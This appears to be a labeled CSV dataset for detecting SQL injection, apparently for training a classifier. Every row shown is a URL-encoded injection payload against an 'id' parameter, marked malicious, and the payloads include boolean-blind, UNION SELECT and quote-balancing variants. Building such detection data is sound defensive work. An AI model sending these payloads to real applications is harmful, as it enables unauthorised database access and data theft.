query,label
/?id=1'%20WHERE%209324%3D9324%20AND%204776%3D2559--%20RpmZ,1
"/?id=1""%20WHERE%207957%3D7957%20AND%209823%3D9969--%20FTJq",1
/?id=1'||(SELECT%20SBbu%20WHERE%204407%3D4407%20AND%203561%3D1260)||',1
/?id=1'||(SELECT%20WjiC%20FROM%20DUAL%20WHERE%202277%3D2277%20AND%209470%3D6463)||',1
/?id=1'%2B(SELECT%20WBpU%20WHERE%201990%3D1990%20AND%205546%3D8150)%2B',1
/?id=1||(SELECT%20gXsp%20FROM%20DUAL%20WHERE%207665%3D7665%20AND%208411%3D3068)||,1
/?id=1||(SELECT%20sTiC%20WHERE%205455%3D5455%20AND%201702%3D1970)||,1
/?id=1'))%20AS%20THET%20WHERE%201979%3D1979%20AND%209006%3D8843--%20DNkP,1
"/?id=1""))%20AS%20QotI%20WHERE%204986%3D4986%20AND%204156%3D3667--%20PoWb",1
/?id=1')%20AS%20xvoz%20WHERE%201878%3D1878%20AND%202972%3D4191--%20jzsb,1
"/?id=1"")%20AS%20PxYa%20WHERE%206919%3D6919%20AND%206189%3D6164--%20afpJ",1
"/?id=1""%3D""1""%20AND%205678%3D8233%20AND%20""1""%3D""1",1
/?id=1'%20IN%20BOOLEAN%20MODE)%20AND%205458%3D8969%23,1
/?id=-1047'%20UNION%20SELECT%201%2C2%2C2%2C3--%20-,1
/?id=-8439)%20OR%207870%3D3740--%20EZoa,1
/?id=-5583)%20OR%209708%3D9708--%20cNdy,1
/?id=-2483)%20OR%208406%3D8868%20AND%20(5057%3D5057,1
/?id=-9429)%20OR%209708%3D9708%20AND%20(1264%3D1264,1
/?id=-1172))%20OR%201274%3D4504%20AND%20((9879%3D9879,1
/?id=-6482))%20OR%209708%3D9708%20AND%20((9389%3D9389,1
/?id=-1570)))%20OR%204183%3D3558%20AND%20(((1722%3D1722,1
/?id=-9821)))%20OR%209708%3D9708%20AND%20(((4667%3D4667,1
/?id=-1352%20OR%201455%3D3305,1
/?id=-6991%20OR%209708%3D9708,1
/?id=-9056%20OR%208531%3D2145--%20kiGa,1
/?id=-4370%20OR%209708%3D9708--%20tgGq,1
/?id=-8386%20OR%201697%3D8450%23%20wjAg,1
/?id=-3006%20OR%209708%3D9708%23%20TDTR,1
/?id=-5721)%20WHERE%207897%3D7897%20OR%208577%3D9125--%20MuEQ,1
/?id=-3025)%20WHERE%207522%3D7522%20OR%209708%3D9708--%20xDfZ,1
/?id=-4955%20WHERE%206850%3D6850%20OR%201245%3D2239--%20Ejga,1
/?id=-6416%20WHERE%208377%3D8377%20OR%209708%3D9708--%20XSDy,1
/?id=-6190))%20AS%20fvYm%20WHERE%201391%3D1391%20OR%209837%3D2187--%20koWQ,1
/?id=-4649))%20AS%20UzAG%20WHERE%209116%3D9116%20OR%209708%3D9708--%20sxxg,1
/?id=-7924)%20AS%20vWHV%20WHERE%207113%3D7113%20OR%204753%3D3754--%20mozk,1
/?id=-6657)%20AS%20buLw%20WHERE%205056%3D5056%20OR%209708%3D9708--%20rCwo,1
/?id=-3518')%20OR%206573%3D7674--%20ZqEs,1
/?id=-1299')%20OR%209708%3D9708--%20meTF,1
/?id=-3537'%20OR%205837%3D8625--%20SqBK,1
/?id=-2073'%20OR%209708%3D9708--%20SxFb,1
"/?id=-8832""%20OR%205195%3D1051--%20bMsB",1
"/?id=-6509""%20OR%209708%3D9708--%20HgqU",1
/?id=-3862')%20OR%204625%3D1738%20AND%20('kLvy'%3D'kLvy,1
/?id=-7601')%20OR%209708%3D9708%20AND%20('eaJc'%3D'eaJc,1
/?id=-6366'))%20OR%207220%3D4374%20AND%20(('Fuqg'%3D'Fuqg,1
/?id=-9450'))%20OR%209708%3D9708%20AND%20(('zHVU'%3D'zHVU,1
/?id=-7946')))%20OR%205982%3D4314%20AND%20((('tNwD'%3D'tNwD,1
/?id=-4196')))%20OR%209708%3D9708%20AND%20((('UhLX'%3D'UhLX,1
/?id=-8205'%20OR%208061%3D8662%20AND%20'kIDB'%3D'kIDB,1
/?id=-8382'%20OR%209708%3D9708%20AND%20'vgaa'%3D'vgaa,1
/?id=-1215')%20OR%209038%3D9225%20AND%20('BOJA'%20LIKE%20'BOJA,1
/?id=-8253')%20OR%209708%3D9708%20AND%20('zwma'%20LIKE%20'zwma,1
/?id=-9245'))%20OR%205573%3D8256%20AND%20(('jhvU'%20LIKE%20'jhvU,1
/?id=-9933'))%20OR%209708%3D9708%20AND%20(('djSl'%20LIKE%20'djSl,1
/?id=-4601')))%20OR%201919%3D8949%20AND%20((('qvSM'%20LIKE%20'qvSM,1
